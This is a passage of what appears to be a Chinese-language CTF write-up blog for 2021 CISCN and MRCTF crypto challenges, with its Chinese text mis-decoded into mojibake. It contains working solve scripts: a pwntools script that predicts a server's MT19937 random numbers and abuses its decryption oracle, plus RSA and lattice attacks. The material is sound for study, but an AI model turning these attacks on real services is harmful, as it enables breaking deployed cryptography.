31, 69, 24, 13, 216, 185, 108, 137, 57, 186, 211, 55, 27, 158, 241, 223, 21, 134, 106, 152, 127, 187, 245, 246, 131, 176, 177, 228, 100, 112, 11, 84, 61, 193, 42, 41, 69, 229, 145, 254, 138, 3, 153, 123, 31]c1 = [ 131, 92, 72, 47, 177, 57, 131, 118, 4, 38, 192, 19, 119, 82, 63, 143, 235, 165, 15, 140, 209, 223, 117, 133, 47, 148, 81, 144, 138, 246, 173, 235, 177, 181, 110, 39, 9, 192, 57, 166, 180, 153, 141, 19, 234, 157, 142, 80, 234, 197, 151, 152, 249, 143, 176, 155, 147, 17, 57, 194, 191, 254, 13, 144, 140, 85, 25, 248, 172, 208, 154, 249, 5, 201, 27, 137, 69, 23, 175, 34, 156, 72, 208, 32, 195, 16, 127, 65, 207, 131, 57, 203, 7, 98, 89, 36, 65, 75, 211, 21, 45, 132, 214, 239, 102, 58, 68, 130, 97, 204, 225, 76, 152, 216, 74, 149, 79, 165, 198, 72, 150, 94, 7, 177, 46, 226, 252, 247, 79, 62, 69, 106, 60, 21, 106, 236, 47, 145, 170, 28, 18, 101, 14, 152, 131, 7, 37, 15, 168, 99, 115, 27, 220, 150, 89, 82, 232, 170, 107, 221, 212, 46, 235, 129, 36, 66, 217, 222, 36, 15, 217, 192, 247, 192, 113, 230, 129, 196, 13, 247, 148, 228, 225, 86, 71, 133, 132, 238, 236, 127, 11, 83, 107, 141, 114, 150, 182, 146, 213, 250, 141, 53, 114, 16, 198, 70, 133, 17, 247, 173, 136, 73, 236, 78, 188, 150, 239, 58, 199, 136, 11, 122, 134, 77, 47, 167, 137, 188, 55, 195, 41, 49, 245, 92, 160, 213, 254, 0, 85, 205, 193, 69, 2, 140, 143, 155, 127, 236, 179, 199, 168, 35, 85, 40, 45, 174]c2 = [ 198, 143, 247, 3, 152, 139, 131, 84, 181, 180, 252, 177, 192, 25, 217, 179, 136, 107, 190, 62, 4, 6, 90, 53, 105, 238, 117, 44, 5, 116, 132, 195, 214, 171, 113, 209, 18, 31, 194, 174, 228, 212, 196, 14, 27, 41, 211, 56, 139, 135, 225, 214, 89, 122, 178, 212, 185, 231, 204, 150, 204, 212, 160, 142, 213, 173, 186, 166, 65, 238, 5, 32, 45, 31, 25, 189, 148, 38, 78, 79, 33, 56, 227, 48, 103, 163, 31, 189, 37, 124, 106, 249, 86, 188, 86, 233, 41, 250, 89, 7, 212, 234, 111, 104, 245, 102, 227, 96, 160, 67, 181, 13, 26, 192, 214, 210, 188, 84, 216, 215, 243, 72, 233, 2, 122, 166, 107, 251, 70, 128, 94, 190, 185, 210, 34, 85, 77, 29, 182, 77, 115, 208, 228, 252, 73, 198, 151, 70, 10, 97, 138, 235, 21, 117, 239, 102, 129, 2, 253, 80, 53, 61, 184, 220, 41, 82, 37, 140, 23, 143, 179, 53, 153, 113, 213, 211, 111, 197, 248, 65, 60, 69, 1, 81, 48, 254, 251, 89, 195, 8, 93, 190, 66, 174, 97, 175, 210, 191, 66, 112, 123, 128, 33, 230, 237, 104, 16, 192, 239, 173, 44, 10, 120, 231, 114, 151, 140, 63, 103, 44, 243, 222, 242, 73, 51, 46, 98, 137, 163, 152, 147, 95, 223, 3, 15, 112, 85, 215, 133, 131, 240, 239, 224, 195, 140, 124, 70, 156, 221, 241, 37, 245, 1, 99, 9, 157, 99, 150, 47, 118, 225, 16, 13, 141, 135, 99, 18, 119, 63, 160, 6, 247, 27, 68, 45, 199, 86, 193, 252, 21, 135, 32, 42, 103, 114, 241, 49, 249, 182, 52, 18, 155, 157, 61, 4, 246, 158, 52, 118, 242, 195, 54, 139, 232, 100, 31, 11, 233, 58, 100, 101, 137, 83, 145, 209, 7, 241, 96, 57, 148, 207, 29, 237, 124, 177, 166, 161, 20, 116, 122, 61, 71, 46, 82, 18, 157, 253, 130, 112, 66, 94, 57, 221, 243, 222, 192, 147, 5, 130, 201, 174, 26, 160, 16, 188, 103, 187, 11, 238, 182, 144, 4, 137, 33, 84, 100, 7, 239, 219, 83, 112, 189, 166, 58, 93, 141, 30, 198, 220, 196, 118, 172, 5, 45]def decrypt(pixel,key1,key2,x0,m,n): num = m*n/8 seqs = [] x = x0 bins = '' tmp = [] for i in range(num): x = generate(x) tmp.append(x) seqs.append(int(x*22000)) for x in seqs: bin_x = bin(x)[2:] if len(bin_x) &lt; 16: bin_x = '0'*(16-len(bin_x))+bin_x bins += bin_x assert(len(pixel) == m*n) cipher = [ 0 for i in range(m) for j in range(n)] for i in range(m): for j in range(n): index = n*i+j ch = int(bins[2*index:2*index+2],2) pix = pixel[index] if ch == 0: pix = (pix^key1)&amp;0xff if ch == 1: pix = (~(pix^key1))&amp;0xff if ch == 2: pix = (pix^key2)&amp;0xff if ch == 3: pix = (~(pix^key2))&amp;0xff cipher[index] = pix return cipherdef generate(x): return round(r * x * (3 - x), 6)key = []for i, j in zip(m1, c1): key.append(i ^ j)'''key1 may 169 177 78 86if key1= 169 key2 only may 78 or 177 8 combinationsey1 = 169 ,key2 = 78 get result'''bitstream = ''X = []for i in key: if i == 78: bitstream += '10' if i == 169: bitstream += '00' if i == 177: bitstream += '11' if i == 86: bitstream += '01'key1 = 169key2 = 78S = time()X0 = int(bitstream[:16],2) / 22000.000000X1 = int(bitstream[16:32],2) / 22000.000000r = round(X1 / (3*X0 - X0**2),1)print(r)for x0 in range(10**6): x = round(x0 / 1000000.000000,6) bins = '' tmp = [] seqs = [] d = 16 for i in range(d): x = generate(x) tmp.append(x) seqs.append(int(x*22000)) for x in seqs: bin_x = bin(x)[2:] if len(bin_x) &lt; 16: bin_x = '0'*(16-len(bin_x))+bin_x bins += bin_x if bitstream[:d*16] == bins: x0 = round(x0 / 1000000.000000,6) breakprint(time()-S,x0)image = decrypt(c2,key1,key2,x0,24,16)data = ''.join(map(chr,image))print md5.new(data).hexdigest() 0x03 homoproblem123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119from poly import *from math import floor, logfrom copy import deepcopyimport osimport randomimport syswith open(&quot;/root/task/flag.txt&quot;, &quot;rb&quot;)as f: flag = f.read()q = 2**54n = 1024t = 83T = 100l = floor(log(q, t))delta = floor(q/t)mu = 0sigma = 1MENU = \\'''1.game2.decrypt'''def encode(s): _s = s + os.urandom(128 - len(flag)) tmp = bin(int.from_bytes(_s, &quot;big&quot;))[2:].zfill(n) tmp = list(map(int, tmp)) TMP = Poly(n, q) TMP.cofficient = deepcopy(tmp) return TMPdef Round(poly, t): c = deepcopy(poly) for i in range(c.n): c.cofficient[i] = c.cofficient[i] % t if c.cofficient[i] &gt;= t/2: c.cofficient[i] -= t return cdef keygen(): s = Poly(n, q) s.randomize(type=2, sigma=sigma, mu=mu) e = Poly(n, q) e.randomize(type=1, sigma=sigma, mu=mu) a = Poly(n, q) a.randomize(B=q) pk = [Round(-1*(a*s+e), q), a] return pk, sdef encrypt(pk, m): u = Poly(n, q) u.randomize(type=1, sigma=sigma, mu=mu) e1 = Poly(n, q) e1.randomize(type=1, sigma=sigma, mu=mu) e2 = Poly(n, q) e2.randomize(type=1, sigma=sigma, mu=mu) return [Round(pk[0]*u+e1+delta*m, q), Round(pk[1]*u+e2, q)]def decrypt(sk, ct): tmp = t * Round(ct[0] + ct[1] * sk, q) for i in range(tmp.n): tmp.cofficient[i] = round(tmp.cofficient[i] / q) return Round(tmp, t)def fun(): if not allowed: print(&quot;I can't let you use this.&quot;) else: a = Poly(n, q) b = Poly(n, q) tmp = [0]*n print(&quot;c0:&quot;) s = input().replace(&quot; &quot;, &quot;&quot;).split(&quot;,&quot;) a.cofficient = deepcopy(list(map(int, s))) print(&quot;c1:&quot;) s = input().replace(&quot; &quot;, &quot;&quot;).split(&quot;,&quot;) b.cofficient = deepcopy(list(map(int, s))) assert a.cofficient != ct[0].cofficient and b.cofficient != ct[1].cofficient assert tmp != a.cofficient and tmp != b.cofficient print(decrypt(sk, [a, b]).cofficient)def game(): global allowed count = 0 random.seed(os.urandom(32)) print(&quot;play a game with me!&quot;) for i in range(512): number = random.getrandbits(64) guess = int(input(&quot;your number:&quot;)) if guess == number: count += 1 print(&quot;win&quot;) else: print(f&quot;lose!my number is {number}\\n&quot;) if count &gt;= 200: allowed = Truepk, sk = keygen()m = encode(flag)ct = encrypt(pk, m)allowed = Falseprint(pk[0].cofficient)print(pk[1].cofficient)print(ct[0].cofficient)print(ct[1].cofficient)while True: print(MENU) option = int(input()) if option == 1: game() elif option == 2: fun() else: print(&quot;error&quot;) sys.exit(1) è¿˜æœ‰ä¸ªpoly.pyæˆ‘åˆ°æœ€åéƒ½æ²¡æœ‰ç”¨ä¸Šã€‚ã€‚å°±ä¸æ”¾ä¸Šæ¥äº† analysesè¿™é¢˜æœ‰ä¸¤éƒ¨åˆ† ç¬¬ä¸€éƒ¨åˆ†ã€‚è®©æˆ‘ä»¬çŒœæœåŠ¡ç«¯ç”Ÿæˆçš„64bitéšæœºæ•°ï¼Œ512æ¬¡æœºä¼šï¼ŒçŒœé”™äº†ä¼šå‘Šè¯‰ä½ éšæœºæ•°æ˜¯ä»€ä¹ˆï¼ŒçŒœå¯¹äº†å°±ç»§ç»­ï¼Œå¦‚æœä¸€å…±çŒœå¯¹200æ¬¡ä»¥ä¸Šå°±å¯ä»¥è¿›å…¥ä¸‹ä¸€éƒ¨åˆ† ç¬¬äºŒéƒ¨åˆ†ã€‚ç™½ç»™çš„åŒæ€åŠ å¯† ç¬¬ä¸€éƒ¨åˆ† MT19937å…¶å®è¿™é‡Œè€ƒçš„å°±æ˜¯ MT19937ï¼Œè¿™æ˜¯python.randomåº“ç”¨çš„ä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³•ï¼ŒçŠ¶æ€æœ‰é™ï¼ŒçŸ¥é“624*32 bitä¹‹åå°±èƒ½å®Œå…¨çš„ç®—å‡ºåç»­çš„éšæœºæ•°ã€‚ è¿˜è®°å¾—ç¬¬ä¸€æ¬¡è§£å‡ºMT19937å°±æ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ¯”èµ›åšå¯†ç ï¼Œ2020 N1CTF - VSS ï¼Œè¿™é“é¢˜å½“æ—¶åšäº†ä¸€æ•´åœºï¼Œå§‹ç»ˆæ²¡æœ‰åšå‡ºæ¥ã€‚çœ‹äº†wpæ‰äº†è§£MT19937è¿™ç§ä¸œè¥¿ï¼Œä¸è¿‡ä¹ŸçŸ¥é“äº†ä¸€ä¸ªå¯ä»¥ç”¨æ¥é¢„æµ‹éšæœºæ•°çš„åº“-&gt; randcrack , å½“æˆ‘ä»¬å¾—åˆ°äº†624*32bitä¹‹åï¼Œå°±èƒ½åˆ©ç”¨è¿™ä¸ªåº“ç®—å‡ºåç»­çš„éšæœºæ•° è€Œè¿™é‡Œåˆšå¥½å¤Ÿï¼Œä¸€å…±512æ¬¡æœºä¼šï¼Œå‰312æ¬¡é”™è¯¯åˆšå¥½å¯ä»¥å¾—åˆ°312*64 bitä¹Ÿå°±æ˜¯624*32 bitï¼Œåé¢çš„200æ¬¡æœºä¼šå°±å¯ä»¥æ¯æ¬¡éƒ½çŒœä¸­äº†ã€‚ ç¬¬äºŒéƒ¨åˆ† åŒæ€åŠ å¯†è¯´æ˜¯åŒæ€åŠ å¯†ã€‚ã€‚ã€‚ä½†æˆ‘å¥½åƒæ²¡ç”¨åˆ°é‡Œé¢çš„çŸ¥è¯†ï¼Ÿ æœåŠ¡ç«¯æä¾›äº†è§£å¯†ï¼Œæˆ‘ä»¬æ˜¯æœ‰å¯†æ–‡çš„ï¼ŒæŒ‰ç†æ¥è¯´ç›´æ¥ç»™å¯†æ–‡å°±è¡Œäº†ï¼Œä½†æ˜¯é¢˜ç›®é™åˆ¶äº†æäº¤ä¸Šå»è§£å¯†çš„å¯†æ–‡ä¸èƒ½æ˜¯flagçš„å¯†æ–‡ è€ƒè™‘åˆ°æ•´ä¸ªè¿‡ç¨‹éƒ½æ˜¯$\\mod q$çš„ï¼Œç›´æ¥ç»™å¯†æ–‡åŠ ä¸Šqå°±è¡Œäº†ã€‚ã€‚ã€‚ 2021/5/18 åƒé¥­çš„æ—¶å€™æƒ³ç€ä¸ºå•¥é¢˜ç›®æ˜¯åŒæ€åŠ å¯†, çªç„¶æƒ³åˆ°è¿™ç©æ„ä¸å°±æ˜¯ä¸ªr-lweå—, æœ¬æ¥å¯†æ–‡æœ‰å™ªéŸ³å°±æ˜¯å¯ä»¥çš„, ç›´æ¥ç»™c0,c1éƒ½åŠ ä¸Š1å°±è¡Œäº†, å™ªéŸ³å¤Ÿå°æ˜¯ä¸ä¼šå½±å“è§£å¯†çš„! exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from pwn import *from randcrack import RandCrackimport randomimport refrom Crypto.Util.number import long_to_bytesR = lambda con: con.recv(1024)S = lambda con, x: con.sendline(x)con = remote('124.70.14.146', 23218)kkk = ''q = 2**54for _ in range(512): k = R(con).decode() kkk += k if 'game' in k: breakkkk = kkk.split('\\n')[:-5]pk = [0, 0]ct = [0, 0]pk[0] = kkk[0][1:-1].split(',')for i in range(len(pk[0])): pk[0][i] = int(pk[0][i])pk[1] = kkk[1][1:-1].split(',')for i in range(len(pk[1])): pk[1][i] = int(pk[1][i])ct[0] = kkk[2][1:-1].split(',')for i in range(len(ct[0])): ct[0][i] = int(ct[0][i])ct[1] = kkk[3][1:-1].split(',')for i in range(len(ct[1])): ct[1][i] = int(ct[1][i])print(len(pk[0]))rc = RandCrack()S(con, b'1')print(R(con).decode())for _ in range(312): S(con, b'1') resp = R(con).decode() # print(resp) num = re.findall('my number is (.*)', resp)[0] r = bin(int(num))[2:].zfill(64) r1 = r[:32] r2 = r[32:] rc.submit(int(r2, 2)) rc.submit(int(r1, 2))num = 0for _ in range(200): S(con, str(rc.predict_getrandbits(64)).encode()) if 'win' in R(con).decode() : num += 1 print(num)c0 = ''for i in ct[0]: c0 += str(i+q)+','c1 = ''for i in ct[1]: c1 += str(i + q)+','S(con, b'2')print(R(con).decode())S(con,c0[:-1].encode())print(R(con).decode())S(con,c1[:-1].encode())flag = ''while True: flag += R(con).decode() if ']' in flag: breakprint(flag)'''result [...] å‡ºæ¥çš„ç»“æœå°±æ˜¯ä¸€å †0,1'''flag = [...]for i in range(len(flag)): flag[i] = str(flag[i])flag = int(''.join(flag),2)print(long_to_bytes(flag)) 0x04 oddaes ä¸ä¼šã€‚ã€‚ã€‚å·®åˆ†åˆ†æï¼Œä¸€ç›´éƒ½æ¯å­¦ä¼šè¿‡ï¼Œç­‰ä¸€ä¸ªwpå­¦ä¹  0x05 rsaproblem1234567891011121314151617181920212223242526272829303132333435363738from flag import text,flagimport md5from Crypto.Util.number import long_to_bytes,bytes_to_long,getPrimeassert md5.new(text).hexdigest() == flag[6:-1]msg1 = text[:xx]msg2 = text[xx:yy]msg3 = text[yy:]msg1 = bytes_to_long(msg1)msg2 = bytes_to_long(msg2)msg3 = bytes_to_long(msg3)p1 = getPrime(512)q1 = getPrime(512)N1 = p1*q1e1 = 3print pow(msg1,e1,N1)print (e1,N1)p2 = getPrime(512)q2 = getPrime(512)N2 = p2*q2e2 = 17e3 = 65537print pow(msg2,e2,N2)print pow(msg2,e3,N2)print (e2,N2)print (e3,N2)p3 = getPrime(512)q3 = getPrime(512)N3 = p3*q3print pow(msg3,e3,N3)print (e3,N3)print p3&gt;&gt;200 analysesç™½ç»™ç­¾åˆ°ã€‚ $e$è¿‡å°å¯¼è‡´ç›´æ¥å¼€$e$æ¬¡æ–¹å¾—$m$ å…±æ¨¡æ”»å‡» å·²çŸ¥$p$é«˜ä½ éƒ½æ˜¯åŸºç¡€ï¼Œä¸è¯¦ç»†å†™äº† exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from Crypto.Util.number import long_to_bytesfrom gmpy2 import irootn = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147c = 59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646e = 65537high_p = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902# high bits of p without low zeroskbits = 200_p = high_p&lt;&lt;kbitsPR.&lt;x&gt; = Zmod(n)[]f = x + _proots = f.small_roots(X=2^kbits,beta=0.4)p = _p+int(roots[0])q = n // pd = int(inverse_mod(e,(p-1)*(q-1)))msg3 = pow(c,d,n)#msg2n = 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977c1 = 54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610c2 = 91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950e1 = 17 e2 = 65537# åˆ©ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—æ±‚å‡ºs1 s2def EX_GCD(a, b, arr, n=0): # æ‰©å±•æ¬§å‡ é‡Œå¾— if b == 0: arr[0] = 1 arr[1] = 0 return a g = EX_GCD(b, a % b, arr) t = arr[0] arr[0] = arr[1] arr[1] = t - int(a / b) * arr[1] return g # output: s * a + t * b = 1 g:æœ€å¤§å…¬å› æ•° arr[0] = s, arr[1] = tarr = [0, 0]EX_GCD(e1, e2, arr)s1 = arr[0]s2 = arr[1]msg2 = (pow(c1, s1, n) * pow(c2, s2, n)) % n# msg1 c = 19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893msg1 = iroot(c,3)[0]msg = long_to_bytes(msg1) + long_to_bytes(msg2) + long_to_bytes(msg3)import md5print(md5.new(msg).hexdigest())","link":"/2021/05/16/writeup-for-2021-CISCN/"},{"title":"writeup for 2021 MRCTF","text":"å•Šæ¯”èµ›çš„æ—¶å€™åˆšå¥½å’Œnpyå‡ºå»ç©äº†, ä¹Ÿæ²¡æ€ä¹ˆçœ‹é¢˜, å°±çœ‹äº†åŠä¸ªä¸‹åˆçš„Common prime rsa. ä¹Ÿæ²¡æ•´å‡ºæ¥.æœ€è¿‘åˆåœ¨å¿™å­¦æ ¡çš„HWå°±æ˜¯ä»€ä¹ˆæˆæœéƒ½æ²¡, åªèƒ½çœ‹ç€å¤§ä½¬å¹²è‡ªå·±åˆ’æ°´çš„é‚£ç§. æ‰€ä»¥é¢˜ç›®å¤ç°ä»€ä¹ˆçš„å°±æ…¢äº†å¥½å¤š.æ…¢æ…¢çš„æ›´æ–°å®Œå§, æ¯æ¬¡åšé¢˜éƒ½ä¸€å †paper, æƒ³æ…¢æ…¢çš„çœ‹å®Œåªèƒ½èŠ±å¤šç‚¹æ—¶é—´äº†å§ Strange_GCDproblem12345678910111213141516171819202122232425262728293031323334353637383940414243444546from gmpy2 import *from random import *from Crypto.Util.number import *from os import urandomfrom flag import flagP_bits = 444Q_bits = 666R_bits = 333key_num = 9e = 0x1337while True: could_not_solve = False p = getPrime(P_bits) if gcd(p-1, e) != 1: continue R = [] Q = [] N = [] for i in range(key_num): Q.append(getPrime(Q_bits)) R.append(getrandbits(R_bits)) N.append(p * Q[-1] + R[-1]) if gcd(Q[-1], e) != 1: could_not_solve = True break if not could_not_solve: breakC = []assert len(flag) == 45for i in range(key_num): tmp_cipher = flag[i*len(flag)//key_num:(i+1)*len(flag)//key_num].encode() tmp_cipher = urandom(128 - len(tmp_cipher)) + tmp_cipher tmp_cipher = pow(bytes_to_long(tmp_cipher), e, p * Q[i]) C.append(tmp_cipher)print('N =', N)print('C =', C)'''N = [...]C = [...]''' analysesè¿™é¢˜æ¯”å®Œèµ›ä»¥ååšçš„, paperä¹Ÿæ˜¯ç›´æ¥å°±çœ‹åˆ«äººæ‰¾äº†è‡ªå·±æ‰¾å¤ªæµªè´¹æ—¶é—´å•¦ åšçš„æ—¶å€™æ²¡çœ‹paper, é€ æ ¼å­æ²¡å»æ€è€ƒæ€ä¹ˆæ¶ˆå»æ¯”è¾ƒå¤§çš„é¡¹, çœ‹äº†paperæ‰æ˜ç™½, AGCDå…ˆæ¥çœ‹çœ‹è¿™è¾¹çš„å…¬é’¥ç”Ÿæˆ, è¿™å…±ç”Ÿæˆäº†9ä¸ª$N_i = p \\cdot q_i + r_i,i=0,1,â€¦,8$å…¶ä¸­$p,q,r$çš„ä½æ•°åˆ†åˆ«ä¸º$444,666,333$, è¿™ä¸ªé—®é¢˜çœ‹ç€åƒLWEä½†æ˜¯æˆ‘ä»¬åªçŸ¥é“$N_i$. å°è¯•äº†ä¸€ä¸‹é€ æ ¼å­ä¹Ÿæ²¡å•¥ç»“æœ, æ‰¾paperæ‰¾åˆ°äº†è¿™ä¸ª-&gt; The Approximate GCD Problem è¿™é‡Œé¢æä¾›äº†ä¸€ä¸ªé€ æ ¼å­çš„æ–¹æ³•æ¥åˆ†è§£$N_i$ å…¶å®è¿™é‡Œé¢å°±æœ‰ä¸€ç§é€ æ ¼å­çš„æ€æƒ³å§? æˆ‘ä»¬æƒ³è¦é€šè¿‡æ ¼åŸºè§„çº¦å¾—å‡ºç»“æœ, é‚£ä¹ˆæˆ‘ä»¬å¿…é¡»ä¿è¯æˆ‘ä»¬éœ€è¦æ±‚å‡ºçš„é‡ä¸ä¼šå¾ˆå¤§(åªæœ‰è¿™æ ·æ‰èƒ½ä½¿å¾—æˆ‘ä»¬è¦æ±‚çš„å‘é‡æ˜¯æœ€çŸ­å‘é‡), æ‰€ä»¥æˆ‘ä»¬çš„ä¸€ä¸ªæ€è·¯, å¯ä»¥æ˜¯æ¶ˆå»ä¸€äº›æ¯”è¾ƒå¤§çš„æ•°, ç•™ä¸‹ä¸€äº›æ¯”è¾ƒå°çš„. åœ¨è¿™é‡Œæˆ‘ä»¬å…ˆæ‹¿ä¸¤è¡Œç­‰å¼æ¥åˆ†æ$$N_0 = p \\cdot q_0 + r_0 \\\\N_1 = p \\cdot q_1 + r_1$$æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¼å­é‡Œæœ‰ä¸ªéå¸¸å¤§çš„$p,q$, å¯ä»¥æƒ³ä¸ªåŠæ³•æ¶ˆå»è¿™ä¸ªå¤§çš„é¡¹å¹¶ä¸”ä¸å¼•å…¥æ¯”ä»–æ›´å¤§çš„é¡¹. ä¸€ä¸ªåŠæ³•å°±æ˜¯é€šè¿‡å‡æ³•!$$N_1q_0 - N_0q_1 = r_1q_0 - r_0q_1 \\tag 1$$é€šè¿‡å‡æ³•å¯ä»¥å°†$1110 $ bitsçš„$pq$å˜æˆäº†å°ä¸€ç‚¹çš„$999$ bits çš„$r_1q_0 - r_0q_1$, è¿™é‡Œå°äº†ç‚¹å°±å¯ä»¥å°è¯•åšæ–‡ç« äº†. æˆ‘ä»¬å¯ä»¥æ ¹æ®$(1)$è¿™ä¸ªå¼å­å†™å‡ºå‰©ä¸‹çš„ä¸€æ ·çš„å¼å­$$\\begin{cases}N_1q_0 - N_0q_1 = r_1q_0 - r_0q_1 \\\\N_2q_0 - N_0q_2 = r_2q_0 - r_0q_2 \\\\\\vdots \\\\N_8q_0 - N_0q_8 = r_8q_0 - r_0q_8\\end{cases}$$æ ¹æ®è¿™ä¸ªå¼å­, å¯ä»¥é€ å‡ºæ ¼å­$$(q_0,q_1,â€¦,q_8)\\begin{pmatrix}2^\\lambda&amp;N_1&amp;N_2&amp;\\cdots&amp;N_8 \\\\0&amp;-N_0&amp;0&amp;\\cdots&amp;0 \\\\0&amp;0&amp;-N_0&amp;\\cdots&amp;0 \\\\0&amp;0&amp;0&amp;\\ddots&amp;0 \\\\0&amp;0&amp;0&amp;\\cdots&amp;-N_0\\end{pmatrix}=(2^\\lambda q_0,r_1q_0-r_0q_1,â€¦,r_8q_0-r_0q_8)$$ $\\lambda$ çš„å–å€¼è¿™é‡Œæœ‰ä¸ªå‚æ•°$\\lambda$éœ€è¦ç¡®å®šä¸‹æ¥, è¿™ä¸ªå‚æ•°è·Ÿæœ€çŸ­å‘é‡çš„ä¸Šç•Œæœ‰å…³, ä¸€ç›´ä»¥æ¥è¿™ä¸ªå‚æ•°éƒ½æ˜¯ç”¨æ¥è°ƒç›®æ ‡å‘é‡é•¿åº¦å’Œæ ¼çš„è¡Œåˆ—å¼ç”¨çš„, ä¹Ÿæ²¡æœ‰å…·ä½“çš„åˆ†æè¿‡, æ¯æ¬¡åšçš„æ—¶å€™éƒ½ç›´æ¥çˆ†ç ´, è¿™æ¬¡æ…¢æ…¢åˆ†æäº†ä¸€ä¸‹. å…ˆæ¥çœ‹æˆ‘ä»¬è¦æ±‚çš„å‘é‡, æš‚æ—¶è®°ä¸º$v$$$\\begin{align}||v|| &amp; = \\sqrt{(2^\\lambda q_0)^2 + (r_1q_0-r_0q_1)^2 + \\cdots +(r_8q_0-r_0q_8)^2} \\\\&amp; \\approx \\sqrt{2^{2\\lambda+1332}+2^{1998}+\\cdots+2^{1998}} \\\\&amp; = \\sqrt{2^{2\\lambda+1332}+2^{2001}} \\\\&amp; \\approx\\begin{cases}2^{1001} , \\lambda \\le 335 \\\\2^{\\lambda + 666} , \\lambda &gt;335\\end{cases}\\end{align}$$å†æ¥çœ‹çœ‹$det(L)$ $$det(L) = 2^\\lambda \\cdot N_0^8 \\approx 2^{\\lambda+8880}$$æ ¼å­æ˜¯9ç»´çš„, é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æœ‰ä¸€ä¸ªç²—ç•¥çš„ä¸ç­‰å¼ $||v|| \\le det(L)^{1/9}$é€šè¿‡ç®€å•çš„è®¡ç®—å°±å¯ä»¥å¾—åˆ°$$129 &lt; \\lambda &lt; 360 \\tag 2$$å¾—åˆ°å‚æ•°çš„å¤§æ¦‚å–å€¼èŒƒå›´, é€‰ä¸€ä¸ªä¸­é—´çš„å°±è¡Œäº†, æƒ³åˆºæ¿€ä¸€ç‚¹å¯ä»¥è¯•è¯•130 359ä¹‹ç±»çš„(åæ­£æˆ‘è¯•äº†éƒ½æ˜¯å¯ä»¥çš„). (2) å¼åªæ˜¯ç²—ç•¥å¾—åˆ°çš„, å› ä¸ºä¸Šç•Œè¿˜æœ‰æ›´ä¸¥æ ¼çš„æ¡ä»¶è€Œä¸”LLLç®—æ³•å®é™…ä¸Šè¦æ¯”ç†è®ºä¸Šè¦å¥½â€¦. æˆ‘ä»¬æ„é€ å‡ºæ ¼å­å¹¶è§„çº¦åå°±èƒ½å¾—åˆ°$q_0$äº†, å‰©ä¸‹çš„å°±æ˜¯ä»¿é€ è¿™ä¸ªæ ¼å­æ„é€ æ±‚$q_1,\\cdots,q_8$çš„æ ¼å­, æ±‚å‡ºæ‰€æœ‰çš„$q$ä»¥å, å› ä¸º$q&gt;r$ , æ‰€ä»¥$N = r \\mod q$, ç›´æ¥å°±å¯ä»¥æ±‚å‡º$r$äº†, ç»§ç»­æ±‚å‡º$p$,ç„¶åå°±æ˜¯æ­£å¸¸çš„RSAè§£å¯†äº†. exp1234567891011121314151617181920212223242526272829from Crypto.Util.number import long_to_bytesN = [...]C = [...]Q = []R = []D = []t = 0for _ in range(9): M = 2^130 L = [[0 for _ in range(9)] for _ in range(9)] L[0] = [M]+N[0:t] + N[t+1:] for i in range(9): L[i][i] = - N[t] L[0][0] = M MQ = abs(matrix(L).LLL()[0][0]) assert MQ % M == 0 Q.append(MQ // M) t+=1for n,q in zip(N,Q): R.append(n % q)p = (N[0] - R[0]) // Q[0]for i in range(9): phi = (p-1) * (Q[i]-1) D.append(inverse_mod(0x1337,phi))for c,d,q in zip(C,D,Q): print(long_to_bytes(pow(c,d,p*q))[-5:].decode(),end='') Common_Prime_RSAproblem12345678910111213141516171819202122232425262728293031323334353637from Crypto.Util.number import *from secret import flagdef get_my_prime(nibt, gamma): g = getPrime(int(nibt * gamma)) while True: p = 2 * g * getPrime(int(nibt * (0.5 - gamma))) + 1 if isPrime(p): break while True: q = 2 * g * getPrime(int(nibt * (0.5 - gamma))) + 1 if isPrime(q): break assert 2 * p &gt; q and 2 * q &gt; p return p, q, gp1, q1, g1 = get_my_prime(1024, 0.2247)p2, q2, g2 = get_my_prime(1024, 0.3247)n1 = p1 * q1n2 = p2 * q2print(hex(n1))# 0x48b11209b62c5bc580d00fc94886272b92814ce35fcd265b2915c6917a299bc54c2c0603c41f8bf7c8f6f2a545eb03d38f99ec995bf6658bb1a2d23056ee21c7230caa2decec688ea9ee00b0d50b39e8cd23eb2c3ddeb20f5ab26777b80052c171f47b716e72f6aee9cece92776fc65119046f9a1ad92c40e2094d7ed7526d49print(hex(pow(bytes_to_long(b'Common prime RSA is a variant of RSA' + long_to_bytes(g1) + b'And the common factor g is large prime and p=2ga+1 q=2gb+1'), 3, n1)))# 0x27d8d7249643668ffc115be8b61775c60596e51f6313b47ad5af8493526922f5e10026a2cdaef74e22c3eec959dd8771abe3495b18d19f97623f5a3f65f22ff8fc294fc37ceb3b43ebbbf8a9bcf622922e22c5520dbd523483b9dc54fdffcd1a1b3f02ca1f53b75413fb79399ca00034f2acf108ac9a01bd24d2b9df6e27d156print(hex(pow(g2, 65537, n1)))# 